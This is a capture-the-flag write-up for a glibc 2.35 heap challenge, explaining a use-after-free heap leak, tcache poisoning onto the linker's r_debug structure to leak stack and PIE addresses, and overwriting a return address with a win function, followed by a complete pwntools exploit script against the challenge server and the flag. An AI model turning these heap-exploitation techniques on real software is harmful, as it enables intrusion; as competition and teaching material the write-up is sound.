# SLIME MACHINE REVENGE REVENGE
> Author: 堇姬Naup

tag: pwn, heap, gilbc 2.35

## description
Tsundere slime is the cutest!!! But it's not easy for you to win her heart.

## writeup
Same concept as the previous question.But it just give me ld base address.
My solution is struct `_r_debug` look like this
```c
struct r_debug
  { 
    int r_version;              /* Version number for this protocol. */

    struct link_map *r_map;     /* Head of the chain of loaded objects. */

    /* This is the address of a function internal to the run-time linker, that will always be called when the linker begins to map in a library or unmap it, and again when the mapping change is complete. The debugger can set a breakpoint at this address if it wants to notice shared object mapping changes. */
    ElfW(Addr) r_brk;
    enum
      { 
        /* This state value describes the mapping change taking place when the `r_brk' address is called. */
        RT_CONSISTENT,          /* Mapping change is complete. */
        RT_ADD,                 /* Beginning to add a new object. */
        RT_DELETE               /* Beginning to remove an object mapping. */
      } r_state;

    ElfW(Addr) r_ldbase;        /* Base address the linker is loaded at. */
  };
```

It has `r_map`. Struct `r_map` have PIE address and r_map-0x10(environ) have stack address.
First is use UAF leak heap base, and use it caculate all heap pointer.
Use tcache poisoning allocate fake chunk to `r_debug` and UAF read r_map address. And then allocate chunk to `r_map` read PIE address and stack address.
If I have PIE base, I can caculate accurately win function address
And malloc one chunk to return address and UAF write win function address. 
Choose exir and will RCE~

PS: Because of ld and libc base offset the same in the same environment, so use house of xxx write libc address may get RCE.

## flag
> NHNC{Tsundere_slime_is_not_that_easy_to_handle_is_it?}

## exploit
```py
from pwn import *
from libs.NAUP_pwn_lib import *
import time
from libs.NAUP_filestructure_lib import *
from libs.NAUP_fmt_lib import *

def s(payload): return r.send(payload)
def sl(payload): return r.sendline(payload)
def sla(after, payload): return r.sendlineafter(after, payload)
def sa(after, payload): return r.sendafter(after, payload)
def rc(num): return r.recv(num)
def rcl(): return r.recvline()
def rcls(num): return r.recvlines(num)
def rcu(payload): return r.recvuntil(payload)
def ita(): return r.interactive()
def cl(): return r.close()
def tsl(): return time.sleep(0.2)

x64_env()

REMOTE_LOCAL=input("local?(y/n):")

if REMOTE_LOCAL=="y":
    r=process('./chal')
    debug_init()
    
else:                                           
    REMOTE_INFO=split_nc("nc 23.146.248.196 41423")

    REMOTE_IP=REMOTE_INFO[0]
    REMOTE_PORT=int(REMOTE_INFO[1])

    r=remote(REMOTE_IP,REMOTE_PORT)

### attach
if input('attach?(y/n)') == 'y':
    p(r)


### heap I/O
def create(size):
    sla(b'>>> ',b'1')
    sla(b'size:',str(size).encode())

def get(idx):
    sla(b'>>> ',b'2')
    sla(b'index: ', str(idx).encode())

def Set(idx,data):
    sla(b'>>> ',b'3')
    sla(b'index: ',str(idx).encode())
    sla(b'data: ',data)

def delete(idx):
    sla(b'>>> ',b'4')
    sla(b'index: ',str(idx).encode())

def EXIT():
    sla(b'>>> ',b'6')
### exploit

## get ld base
sla(b'>>> ',b'5')
rcu(b"gift: ")
ld_base = int(rcl().strip(),16)
r_debug = ld_base + 0x3b118 

## leak heap base
create(0x60) #0
create(0x60) #1
delete(0)
delete(1)
get(0)

rcu(b']: ')
leakheap = u64(rc(5).ljust(8,b'\x00'))
heapbase = leakheap << 12

chunk0_ptr_addr = heapbase + 0x290 - 0x10
chunk1_ptr_addr = heapbase + 0x300 - 0x10

ld_r_debug_addr = (r_debug - 0x8+0x10) ^ (chunk1_ptr_addr >> 12)
Set(1,p64(ld_r_debug_addr))

## leak r map address
create(0x60) #2
create(0x60) #3

get(3)
rcu(b']: ')
leak_r_map = u64(rc(6).ljust(8,b'\x00'))
environ = leak_r_map - 0x10

## leak stack
create(0x50) #4
create(0x50) #5
delete(4)
delete(5)

chunk4_ptr_addr = heapbase + 0x370 - 0x10
chunk5_ptr_addr = heapbase + 0x3d0 - 0x10

leak_environ_addr = (environ) ^ (chunk5_ptr_addr >> 12)
Set(5,p64(leak_environ_addr))
create(0x50) #6
create(0x50) #7

get(7)
rcu(b']: ')
leakstack = u64(rc(6).ljust(8,b'\x00'))

## leak pie
create(0x40) #8
create(0x40) #9
delete(8)
delete(9)

chunk8_ptr_addr = heapbase + 0x430 - 0x10
chunk9_ptr_addr = heapbase + 0x480 - 0x10
leak_r_map_addr = (leak_r_map+0x10) ^ (chunk9_ptr_addr >> 12)

Set(9,p64(leak_r_map_addr))
create(0x40) #10
create(0x40) #11
get(11)
rcu(b']: ')
leakPIE = u64(rc(6).ljust(8,b'\x00'))
PIE_base = leakPIE - 0x3d68

win_addr = PIE_base + 0x1681 + 0x5
ret_addr = leakstack-0x120

create(0x30) #12
create(0x30) #13
delete(12)
delete(13)

chunk12_ptr_addr = heapbase + 0x4d0 - 0x10
chunk13_ptr_addr = heapbase + 0x510 - 0x10

leak_retaddr = (ret_addr-0x8) ^ (chunk13_ptr_addr >> 12)
Set(13,p64(leak_retaddr))
create(0x30) #14
create(0x30) #15

Set(15,b'a'*0x8 + p64(win_addr))

EXIT()

### INFO
NAUPINFO("LEAKHEAP",hex(leakheap))
NAUPINFO("HEAPBASE",hex(heapbase))
NAUPINFO("LD BASE",hex(ld_base))
NAUPINFO("R_DEBUG",hex(r_debug))
NAUPINFO("fake_chunk",hex(ld_base + 0x3b118 -0x8))
NAUPINFO("LEAK R MAP",hex(leak_r_map))
NAUPINFO("LEAK STACK",hex(leakstack))
NAUPINFO("LEAK PIE ADDR",hex(leak_r_map+0x10))
NAUPINFO("LEAK PIE",hex(leakPIE))
NAUPINFO("PIEBASE",hex(PIE_base))
NAUPINFO("WIN ADDR",hex(win_addr))
NAUPINFO("LEAK ret_addr",hex(ret_addr))
### interactive
ita()
```
